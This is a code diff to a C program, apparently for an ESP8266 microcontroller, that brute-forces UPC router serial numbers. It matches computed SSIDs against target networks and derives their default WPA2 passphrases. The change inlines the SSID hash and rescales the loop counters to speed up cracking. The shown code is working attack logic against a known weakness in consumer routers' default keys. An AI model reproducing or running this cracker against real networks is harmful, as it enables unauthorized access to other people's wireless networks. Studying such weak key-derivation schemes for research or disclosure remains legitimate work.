@@ -560,12 +560,15 @@ static void crack(os_event_t *events){
     }
     size_t jobs_idx;
     crack_job_t *job;
+    // inline upc_generate_ssid
+    uint64_t a = buf[0] + buf[1] + buf[2] + MAGIC_24GHZ;
+    uint32_t serial = (a - (((a * MAGIC2) >> 54) - (a >> 31)) * 10000000);
     for(jobs_idx = 0; jobs_idx < last_active_job; jobs_idx++){
         job = running_jobs[jobs_idx];
         if(!job){
             continue;
         }
-        if (upc_generate_ssid(buf, MAGIC_24GHZ) != job->target)
+        if (serial != job->target)
             continue;
 
         size_t required_size = 8*(job->passwords_found+3);
@@ -582,7 +585,7 @@ static void crack(os_event_t *events){
         for(prefix_idx = 0; prefix_idx < 3; prefix_idx++){
             char serial[13] = {0};
             char *pass = job->candidate_passwords+(8*(job->passwords_found));
-            os_sprintf(serial, "%s%d%03d%d", prefix[prefix_idx], buf[0], buf[1], buf[2]);
+            os_sprintf(serial, "%s%d%03d%d", prefix[prefix_idx], buf[0]/2500000, buf[1]/6800, buf[2]);
             serial2pass(serial, pass);
             //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
             job->passwords_found++;
@@ -592,14 +595,14 @@ static void crack(os_event_t *events){
     buf[2]++;
     if(buf[2] == MAX2+1){
         buf[2] = 0;
-        buf[1]++;
+        buf[1] += 6800;
     }
-    if(buf[1] == MAX1+1){
+    if(buf[1] == (MAX1+1)*6800){
         buf[1] = 0;
-        printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0], MAX0);
-        buf[0]++;
+        printf("Cracking %u target(s)... %u/%u\n", jobs_active, buf[0]/2500000, MAX0);
+        buf[0] += 2500000;
     }
-    if(buf[0] == MAX0+1){
+    if(buf[0] == (MAX0+1)*2500000){
         buf[0] = 0;
         buf[1] = 0;
         buf[2] = 0;
